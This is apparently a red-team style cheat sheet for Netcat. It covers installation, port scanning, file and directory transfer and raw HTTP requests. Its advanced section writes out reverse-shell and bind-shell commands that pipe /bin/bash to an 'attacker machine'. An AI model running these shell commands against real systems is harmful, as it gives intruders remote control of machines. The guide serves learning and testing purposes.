# Netcat 🐾📡
#Tool #RED #TTNet 

Netcat (often called the “Swiss Army knife” of networking) is a versatile tool for network debugging, testing, and exploration. This guide will help you master Netcat like a networking wizard. 🧙‍♂️✨

**LINK TO TOOL DOCUMENTATION[ HERE](https://www.kali.org/tools/netcat/)**

**Netcat (nc)** is a powerful networking utility for reading and writing data across networks. It's used for:
- Debugging and testing network connections.
- File transfers.
- Port scanning.
- Setting up reverse shells and backdoors.

---
![net cat](https://upload.wikimedia.org/wikipedia/ru/2/29/Netcat_logo.png)

---

### 🚀 Installing Netcat (nc)

#### 🔹 **Debian/Ubuntu** 
```sh 
sudo apt update && sudo apt install netcat -y
```

#### 🔹 **Windows (Nmap Version)**
Download from: [Nmap Netcat](https://nmap.org/ncat/)

---

## 🧰 Common Commands

## 🌟 Most Commonly Used Command
```bash
nc -nvlp *.*.*.*
```
Set up a listener with numeric IPs, verbose output, and a specified port.

### 🔍 Basic Port Scanning
```bash
nc -zv 192.168.1.1 20-80
```
Scan ports 20 to 80 on a target host.

### 📡 Establish a TCP Connection
```bash
nc 192.168.1.1 80
```
Connect to port 80 on the target host.

### 🛠 Listen for Incoming Connections
```bash
nc -l -p 1234
```
Set up a listener on port 1234.

### 🔄 File Transfer (Send)
```bash
nc -w 3 192.168.1.2 1234 < file.txt
```
Send a file to a listener.

### 🔄 File Transfer (Receive)
```bash
nc -l -p 1234 > file.txt
```
Receive a file sent to a listener.

---

## ⚙️ Advanced Usage

### 🌐 Create a Reverse Shell
#### Listener (on Attacker Machine):
```bash
nc -l -p 4444
```
#### Target Machine:
```bash
nc 192.168.1.10 4444 -e /bin/bash
```
Establish a reverse shell to the attacker machine.

### 🖥️ Create a Bind Shell
#### Target Machine:
```bash
nc -l -p 5555 -e /bin/bash
```
#### Attacker Machine:
```bash
nc 192.168.1.20 5555
```
Connect to the bind shell on the target machine.

### 📜 HTTP Requests
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```
Manually send an HTTP GET request to a web server.

### 🛡️ Transfer Directories
#### On Sending Machine:
```bash
tar -czf - /path/to/dir | nc -w 3 192.168.1.2 1234
```
#### On Receiving Machine:
```bash
nc -l -p 1234 | tar -xzf -
```
Transfer an entire directory over the network.

---

## 📋 Handy Options

| Option        | Description                                     |
|---------------|-------------------------------------------------|
| `-l`          | Listen for incoming connections                 |
| `-p`          | Specify the local port to use                  |
| `-z`          | Perform a port scan without sending data       |
| `-v`          | Enable verbose mode                            |
| `-e`          | Execute a command after connection             |
| `-w`          | Set a timeout for connections (in seconds)     |
| `-u`          | Use UDP instead of TCP                         |

---

## 🌐 Example Scenarios

### Scenario 1: Simple Chat Between Two Machines
#### Machine A:
```bash
nc -l -p 5678
```
#### Machine B:
```bash
nc 192.168.1.5 5678
```

### Scenario 2: Copy Files Across Hosts
#### Sender:
```bash
nc -w 3 192.168.1.2 1234 < secret.zip
```
#### Receiver:
```bash
nc -l -p 1234 > secret.zip
```

### Scenario 3: Basic TCP Port Scan
```bash
nc -zv 192.168.1.10 20-100
```

---

## 🚀 Pro Tips

### 1️⃣ Combine with Scripts
Use Netcat in scripts to automate testing and data collection.

### 2️⃣ Use with Sudo
Elevated permissions may be required for specific ports and operations.

### 3️⃣ Secure Connections
Netcat itself does not encrypt connections. For secure alternatives, consider tools like **Socat** or SSH.

---

## 📚 References
- [Netcat Official Documentation](https://manpages.ubuntu.com/manpages/bionic/man1/nc.1.html)
- [Network Basics Guide](https://en.wikipedia.org/wiki/Network_socket)

---

